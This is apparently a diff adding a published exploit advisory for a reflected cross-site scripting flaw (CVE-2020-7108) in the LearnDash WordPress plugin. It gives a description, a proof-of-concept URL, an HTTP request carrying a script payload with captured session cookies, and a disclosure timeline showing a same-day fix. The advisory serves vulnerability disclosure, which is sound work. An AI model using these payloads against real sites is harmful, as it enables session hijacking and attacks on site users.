@@ -1,0 +1,37 @@
+# Exploit Title: LearnDash WordPress LMS Plugin 3.1.2 - Reflective Cross-Site Scripting
+# Date: 2020-01-14
+# Vendor Homepage: https://www.learndash.com
+# Vendor Changelog: https://learndash.releasenotes.io/release/uCskc-version-312
+# Exploit Author: Jinson Varghese Behanan
+# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/reflected-xss-vulnerability-found-in-learndash-lms-plugin/
+# Author Homepage: https://www.jinsonvarghese.com
+# Version: 3.0.0 - 3.1.1
+# CVE : CVE-2020-7108
+
+1. Description
+
+LearnDash is one of the most popular and easiest to use WordPress LMS plugins in the market. It allows users to easily create courses and sell them online and boasts a large customer base. The plugin allows users to search for courses they have subscribed to using the [ld_profile] search field, which was found to be vulnerable to reflected cross site scripting. All WordPress websites using LearnDash version 3.0.0 through 3.1.1 are affected.
+
+2. Proof of Concept
+
+Once the user is logged in to the WordPress website where the vulnerable LearnDash plugin is installed, the XSS payload can be inserted into the Search Your Courses box. The payload gets executed because the user input is not properly validated. As a result, passing the XSS payload as a query string in the URL will also execute the payload.
+
+[wordpress website][learndash my-account page]?ld-profile-search=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+An attacker can modify the above URL and use an advanced payload that could help him/her in performing malicious actions.
+
+GET /wp-admin/admin-ajax.php?action=ld30_ajax_profile_search&shortcode_instance%5Buser_id%5D=1&shortcode_instance%5Bper_page%5D=20&shortcode_instance%5Border%5D=DESC&shortcode_instance%5Borderby%5D=ID&shortcode_instance%5Bcourse_points_user%5D=yes&shortcode_instance%5Bexpand_all%5D=false&shortcode_instance%5Bprofile_link%5D=true&shortcode_instance%5Bshow_header%5D=yes&shortcode_instance%5Bshow_quizzes%5D=true&shortcode_instance%5Bshow_search%5D=yes&shortcode_instance%5Bquiz_num%5D=20&shortcode_instance%5Bpaged%5D=1&shortcode_instance%5Bs%5D=&ld-profile-search=%3Cscript%3Ealert(123)%3C%2Fscript%3E HTTP/1.1
+Host: learndashtesting.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://learndashtesting.com/my-account-2/
+Cookie: wordpress_bcfe62773b0917e2688ccaecd96abe61=jinson%7C1581504173%7CeztvQWuKhSrnfkyEkwN0TvUU4CuVBpuyXeGErewuFOv%7C7ec9ebfd67acdbc669395821f620198e67cb74780c9a8db63923b528aa661acd; PHPSESSID=e7c30849dbdab6f1cafcccef0ad7e7a0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_bcfe62773b0917e2688ccaecd96abe61=jinson%7C1581504173%7CeztvQWuKhSrnfkyEkwN0TvUU4CuVBpuyXeGErewuFOv%7Cfcf64acbc9b6ba7aaafb9c3b077581347d65ca8e010135cc232dcfc0335ec6d8; wordpress_cf_adm_use_adm=1; tk_ai=woo%3AEeO%2FMlU5TcDNKIjgYWPHxZVg; wp-settings-time-1=1581331685
+
+3. Timeline
+
+Vulnerability reported to the LearnDash team – January 14, 2020
+LearnDash version 3.1.2 containing the fix released – January 14, 2020
